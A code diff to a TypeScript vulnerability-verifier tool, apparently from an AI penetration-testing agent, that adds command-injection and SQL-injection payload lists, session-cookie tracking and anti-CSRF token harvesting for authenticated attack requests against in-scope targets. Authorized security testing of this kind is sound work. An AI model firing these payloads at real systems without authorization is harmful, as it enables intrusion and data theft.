@@ -2,6 +2,7 @@ import { Type } from "typebox";
 import type { ToolDefinition } from "@earendil-works/pi-coding-agent";
 import type { ToolRuntime } from "../types.js";
 import { observeAttackSurface } from "../runtime/coverage-auditor.js";
+import { extractHtmlToken, mergeSessionHeaders, rememberResponseCookies } from "../runtime/session-headers.js";
 import { emitToolEvidence, isInScope, jsonResult, resolveTargetUrl, textResult } from "./common.js";
 import { sendHttp } from "./http.js";
 
@@ -17,6 +18,22 @@ type VerifyResult = {
 };
 
 type HttpProbe = { method: string; url: string; status: number; headers: Record<string, string>; body: string; requestHeaders: Record<string, string>; requestBody?: string };
+
+/** Active runtime for the current verifier execute; used to persist Set-Cookie into the session jar. */
+let activeVerifierRuntime: ToolRuntime | undefined;
+
+async function sendHttpTracked(input: {
+  method: string;
+  url: string;
+  headers: Record<string, string>;
+  body?: string;
+  proxyUrl?: string;
+}): Promise<{ status: number; statusText: string; headers: Record<string, string>; body: string }> {
+  const headers = activeVerifierRuntime ? mergeSessionHeaders(activeVerifierRuntime, input.headers) : input.headers;
+  const result = await sendHttp({ ...input, headers });
+  if (activeVerifierRuntime) rememberResponseCookies(activeVerifierRuntime, result.headers);
+  return result;
+}
 
 export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
   return {
@@ -67,28 +84,44 @@ export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
       const url = resolveTargetUrl(runtime, params.url);
       if (!isInScope(runtime, url)) throw new Error(`out of scope: ${url}`);
       const vulnClass = String(params.vuln_class || "").toLowerCase();
-      const headers = params.headers || {};
-      const result = await runVerifier(vulnClass, url, params, headers, runtime.trafficProxyUrl);
-      const trafficIds = persistVerifierTraffic(runtime, result);
-      result.traffic_ids = trafficIds;
-      result.baseline_traffic_id = trafficIds[0];
-      result.attack_traffic_id = trafficIds[1] || trafficIds[0];
-      const evidenceId = await emitToolEvidence(runtime, "verifier", `${vulnClass} ${url} -> ${result.confirmed ? "confirmed" : "not confirmed"}`, result);
-      result.evidence_id = evidenceId;
-      await observeAttackSurface(runtime, {
-        method: params.method || "GET",
-        url,
-        responseBody: JSON.stringify(result),
-        evidenceIds: [evidenceId],
-        source: "verifier",
-      });
-      await markVerified(runtime, url, params.param || defaultParam(vulnClass), vulnClass, result, evidenceId);
-      return jsonResult(result, { evidenceId });
+      const headers = mergeSessionHeaders(runtime, params.headers || {});
+      activeVerifierRuntime = runtime;
+      try {
+        const result = await runVerifier(vulnClass, url, params, headers, runtime.trafficProxyUrl);
+        const trafficIds = persistVerifierTraffic(runtime, result);
+        result.traffic_ids = trafficIds;
+        result.baseline_traffic_id = trafficIds[0];
+        result.attack_traffic_id = trafficIds[1] || trafficIds[0];
+        const evidenceId = await emitToolEvidence(runtime, "verifier", `${vulnClass} ${url} -> ${result.confirmed ? "confirmed" : "not confirmed"}`, result);
+        result.evidence_id = evidenceId;
+        await observeAttackSurface(runtime, {
+          method: params.method || "GET",
+          url,
+          responseBody: JSON.stringify(result),
+          evidenceIds: [evidenceId],
+          source: "verifier",
+        });
+        await markVerified(runtime, url, params.param || defaultParam(vulnClass), vulnClass, result, evidenceId);
+        const payload: Record<string, unknown> = { ...result };
+        if (result.confirmed) {
+          payload.next_step =
+            `Call finding(action='confirm') immediately with evidence_ids=['${evidenceId}'] and full severity/location/impact/poc/remediation. Do not defer confirmation.`;
+        }
+        return jsonResult(payload, { evidenceId });
+      } finally {
+        activeVerifierRuntime = undefined;
+      }
     },
   };
 }
 
-async function runVerifier(vulnClass: string, url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
+async function runVerifier(
+  vulnClass: string,
+  url: string,
+  params: any,
+  headers: Record<string, string>,
+  proxyUrl?: string,
+): Promise<VerifyResult> {
   if (vulnClass === "command-injection") return verifyCommandInjection(url, params, headers, proxyUrl);
   if (vulnClass === "file-inclusion") return verifyFileInclusion(url, params, headers, proxyUrl);
   if (vulnClass === "sql-injection") return verifySqlInjection(url, params, headers, proxyUrl);
@@ -109,29 +142,50 @@ async function runVerifier(vulnClass: string, url: string, params: any, headers:
 
 async function verifyCommandInjection(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const param = params.param || "ip";
-  const payload = params.payload || "127.0.0.1;id";
+  const payloads = uniquePayloads([
+    params.payload,
+    "127.0.0.1;id",
+    "127.0.0.1|id",
+    "127.0.0.1 && id",
+    "127.0.0.1; id",
+  ]);
   const baselinePayload = params.baseline_payload || "127.0.0.1";
   const baseline = await requestWithParam(url, params.method || "POST", param, baselinePayload, headers, proxyUrl);
-  const response = await requestWithParam(url, params.method || "POST", param, payload, headers, proxyUrl);
-  const marker = /\buid=\d+\([^)]*\)|\bgid=\d+\([^)]*\)|www-data|root/.exec(response.body)?.[0];
+  const probes: HttpProbe[] = [baseline];
+  let confirmed = false;
+  let marker: string | undefined;
+  let winningPayload = payloads[0] || "";
+  let attack = baseline;
   const baselineHasMarker = /\buid=\d+\(|\bgid=\d+\(|www-data|root/.test(baseline.body);
-  const confirmed = Boolean(marker) && !baselineHasMarker;
+  for (const payload of payloads) {
+    const response = await requestWithParam(url, params.method || "POST", param, payload, headers, proxyUrl);
+    probes.push(response);
+    const hit = /\buid=\d+\([^)]*\)|\bgid=\d+\([^)]*\)|www-data|root/.exec(response.body)?.[0];
+    if (hit && !baselineHasMarker) {
+      confirmed = true;
+      marker = hit;
+      winningPayload = payload;
+      attack = response;
+      break;
+    }
+  }
   return {
     confirmed,
     reason: confirmed ? "command output marker observed only after injected payload" : "no command output marker observed",
     requests: [
       { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
-      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
+      { method: attack.method, url: attack.url, status: attack.status, marker: marker || undefined },
     ],
     details: {
       param,
       baseline_payload: baselinePayload,
-      injected_payload: payload,
+      injected_payload: winningPayload,
+      payloads_tried: payloads,
       baseline_length: baseline.body.length,
-      injected_length: response.body.length,
+      injected_length: attack.body.length,
       marker,
-      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
-      probes: [probeDetails(baseline, "baseline"), probeDetails(response, "attack")],
+      response_excerpt: marker ? excerptAround(attack.body, marker) : attack.body.slice(0, 500),
+      probes: probes.map((probe, index) => probeDetails(probe, index === 0 ? "baseline" : "attack")),
     },
   };
 }
@@ -167,29 +221,59 @@ async function verifyFileInclusion(url: string, params: any, headers: Record<str
 async function verifySqlInjection(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
   const param = params.param || "id";
   const baselinePayload = params.baseline_payload || "1";
-  const payload = params.payload || "1' OR '1'='1";
+  const payloads = uniquePayloads([
+    params.payload,
+    "1' OR '1'='1",
+    "1' OR '1'='1' -- ",
+    "1 OR 1=1",
+    "1' UNION SELECT null, version() -- ",
+  ]);
   const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers, proxyUrl);
-  const response = await requestWithParam(url, params.method || "GET", param, payload, headers, proxyUrl);
-  const marker = /First name:|Surname:|SQL syntax|You have an error|MariaDB|MySQL|admin/i.exec(response.body)?.[0];
-  const confirmed = Boolean(marker) && meaningfulDifference(baseline.body, response.body);
+  const probes: HttpProbe[] = [baseline];
+  let confirmed = false;
+  let marker: string | undefined;
+  let winningPayload = payloads[0] || "";
+  let attack = baseline;
+  for (const payload of payloads) {
+    const response = await requestWithParam(url, params.method || "GET", param, payload, headers, proxyUrl);
+    probes.push(response);
+    const hit = /First name:|Surname:|SQL syntax|You have an error|MariaDB|MySQL|admin|sqlite_version|UNION/i.exec(response.body)?.[0];
+    if (hit && meaningfulDifference(baseline.body, response.body)) {
+      confirmed = true;
+      marker = hit;
+      winningPayload = payload;
+      attack = response;
+      break;
+    }
+  }
   return {
     confirmed,
     reason: confirmed ? "SQL payload produced database-specific or semantic response difference" : "SQL payload did not produce a meaningful difference",
     requests: [
       { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
-      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
+      { method: attack.method, url: attack.url, status: attack.status, marker: marker || undefined },
     ],
     details: {
       param,
       baseline_payload: baselinePayload,
-      injected_payload: payload,
+      injected_payload: winningPayload,
+      payloads_tried: payloads,
       baseline_length: baseline.body.length,
-      injected_length: response.body.length,
+      injected_length: attack.body.length,
       marker,
-      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
-      probes: [probeDetails(baseline, "baseline"), probeDetails(response, "attack")],
+      response_excerpt: marker ? excerptAround(attack.body, marker) : attack.body.slice(0, 500),
+      probes: probes.map((probe, index) => probeDetails(probe, index === 0 ? "baseline" : "attack")),
     },
   };
+}
+
+function uniquePayloads(values: Array<string | undefined>): string[] {
+  const out: string[] = [];
+  for (const value of values) {
+    const text = String(value || "").trim();
+    if (text && !out.includes(text)) out.push(text);
+  }
+  return out;
 }
 
 async function verifyReflectedXss(url: string, params: any, headers: Record<string, string>, proxyUrl?: string): Promise<VerifyResult> {
@@ -232,8 +316,8 @@ async function verifyStoredXss(url: string, params: any, headers: Record<string,
   }
   const postHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
   const postBody = new URLSearchParams(fields).toString();
-  const postResponse = await sendHttp({ method: "POST", url, headers: postHeaders, body: postBody, proxyUrl });
-  const getResponse = await sendHttp({ method: "GET", url, headers, proxyUrl });
+  const postResponse = await sendHttpTracked({ method: "POST", url, headers: postHeaders, body: postBody, proxyUrl });
+  const getResponse = await sendHttpTracked({ method: "GET", url, headers, proxyUrl });
   const post: HttpProbe = { method: "POST", url, status: postResponse.status, headers: postResponse.headers, body: postResponse.body, requestHeaders: postHeaders, requestBody: postBody };
   const get: HttpProbe = { method: "GET", url, status: getResponse.status, headers: getResponse.headers, body: getResponse.body, requestHeaders: headers };
   const confirmed = get.body.includes(payload);
@@ -291,7 +375,7 @@ async function verifyWeakSessionId(url: string, params: any, headers: Record<str
   const values: string[] = [];
   const requests: VerifyResult["requests"] = [];
   for (let i = 0; i < samples; i += 1) {
-    const response = await sendHttp({ method: "GET", url, headers, proxyUrl });
+    const response = await sendHttpTracked({ method: "GET", url, headers, proxyUrl });
     requests.push({ method: "GET", url, status: response.status });
     const cookie = response.headers["set-cookie"] || "";
     const match = /(?:^|,\s*)([^=;,]+)=([^;,]+)/.exec(cookie);
@@ -314,7 +398,7 @@ async function verifyFileUpload(url: string, params: any, headers: Record<string
   const fields = { ...(params.fields || {}), btnUpload: params.fields?.btnUpload || "Upload" };
   const body = multipartBody(boundary, fields, fileField, filename, fileContent);
   const requestHeaders = { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` };
-  const uploadResponse = await sendHttp({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
+  const uploadResponse = await sendHttpTracked({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
   const uploadProbe: HttpProbe = {
     method: "POST",
     url,
@@ -329,7 +413,7 @@ async function verifyFileUpload(url: string, params: any, headers: Record<string
   const retrievals: HttpProbe[] = [];
   let retrieved: HttpProbe | undefined;
   for (const candidate of candidates) {
-    const response = await sendHttp({ method: "GET", url: candidate, headers, proxyUrl });
+    const response = await sendHttpTracked({ method: "GET", url: candidate, headers, proxyUrl });
     const probe: HttpProbe = {
       method: "GET",
       url: candidate,
@@ -379,7 +463,8 @@ async function verifyCsrf(url: string, params: any, headers: Record<string, stri
   const attackFields = { ...(params.fields || {}) };
   if (params.stale_token) attackFields[tokenParam] = String(params.stale_token);
   else delete attackFields[tokenParam];
-  const attack = await requestWithFields(url, method, attackFields, headers, proxyUrl);
+  // CSRF probes must NOT harvest a valid form token into the attack body.
+  const attack = await requestWithFields(url, method, attackFields, headers, proxyUrl, { injectAntiCsrf: false });
   const after = await sendProbe("GET", checkUrl, headers, undefined, proxyUrl);
   const attackSuccess = successPattern ? successPattern.test(attack.body) : !failurePattern.test(attack.body) && attack.status < 400;
   const stateChanged = meaningfulDifference(baseline.body, after.body) || submittedValueAppeared(baseline.body, after.body, attackFields);
@@ -495,16 +580,37 @@ async function verifyJavascriptLogic(url: string, params: any, headers: Record<s
 
 async function requestWithParam(url: string, method: string, param: string, payload: string, headers: Record<string, string>, proxyUrl?: string): Promise<HttpProbe> {
   if (method.toUpperCase() === "POST") {
-    const body = new URLSearchParams({ [param]: payload, Submit: "Submit" }).toString();
+    const fields: Record<string, string> = { [param]: payload, Submit: "Submit" };
+    await injectAntiCsrfTokens(url, fields, headers, proxyUrl);
+    const body = new URLSearchParams(fields).toString();
     const requestHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
-    const response = await sendHttp({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
+    const response = await sendHttpTracked({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
     return { method: "POST", url, status: response.status, headers: response.headers, body: response.body, requestHeaders, requestBody: body };
   }
   const target = new URL(url);
   target.searchParams.set(param, payload);
   if (!target.searchParams.has("Submit")) target.searchParams.set("Submit", "Submit");
-  const response = await sendHttp({ method: "GET", url: target.toString(), headers, proxyUrl });
+  const response = await sendHttpTracked({ method: "GET", url: target.toString(), headers, proxyUrl });
   return { method: "GET", url: target.toString(), status: response.status, headers: response.headers, body: response.body, requestHeaders: headers };
+}
+
+/** Fetch the form page and merge anti-CSRF / user_token fields for high-security authenticated POSTs. */
+async function injectAntiCsrfTokens(
+  url: string,
+  fields: Record<string, string>,
+  headers: Record<string, string>,
+  proxyUrl?: string,
+): Promise<void> {
+  if (fields.user_token || fields.csrf || fields.csrf_token || fields.token) return;
+  try {
+    const page = await sendHttpTracked({ method: "GET", url, headers, proxyUrl });
+    const tokens = extractHtmlToken(page.body);
+    for (const [key, value] of Object.entries(tokens)) {
+      if (!fields[key]) fields[key] = value;
+    }
+  } catch {
+    // Best-effort token harvest; probe continues without it.
+  }
 }
 
 function result(confirmed: boolean, reason: string, response: { method: string; url: string; status: number; body: string }, marker?: string): VerifyResult {
@@ -517,7 +623,7 @@ function result(confirmed: boolean, reason: string, response: { method: string; 
 }
 
 async function sendProbe(method: string, url: string, headers: Record<string, string>, body?: string, proxyUrl?: string): Promise<HttpProbe> {
-  const response = await sendHttp({ method, url, headers, body, proxyUrl });
+  const response = await sendHttpTracked({ method, url, headers, body, proxyUrl });
   return { method, url, status: response.status, headers: response.headers, body: response.body, requestHeaders: headers, requestBody: body };
 }
 
@@ -527,16 +633,22 @@ async function requestWithFields(
   fields: Record<string, string>,
   headers: Record<string, string>,
   proxyUrl?: string,
+  options: { injectAntiCsrf?: boolean } = {},
 ): Promise<HttpProbe> {
   if (method.toUpperCase() === "GET") {
     const target = new URL(url);
     for (const [key, value] of Object.entries(fields)) target.searchParams.set(key, value);
-    const response = await sendHttp({ method: "GET", url: target.toString(), headers, proxyUrl });
+    const response = await sendHttpTracked({ method: "GET", url: target.toString(), headers, proxyUrl });
     return { method: "GET", url: target.toString(), status: response.status, headers: response.headers, body: response.body, requestHeaders: headers };
   }
-  const body = new URLSearchParams(fields).toString();
+  const nextFields = { ...fields };
+  // Default true for normal authenticated POSTs; CSRF attacks pass injectAntiCsrf=false so omit/stale paths stay intentional.
+  if (options.injectAntiCsrf !== false) {
+    await injectAntiCsrfTokens(url, nextFields, headers, proxyUrl);
+  }
+  const body = new URLSearchParams(nextFields).toString();
   const requestHeaders = { "content-type": "application/x-www-form-urlencoded", ...headers };
-  const response = await sendHttp({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
+  const response = await sendHttpTracked({ method: "POST", url, headers: requestHeaders, body, proxyUrl });
   return { method: "POST", url, status: response.status, headers: response.headers, body: response.body, requestHeaders, requestBody: body };
 }
 
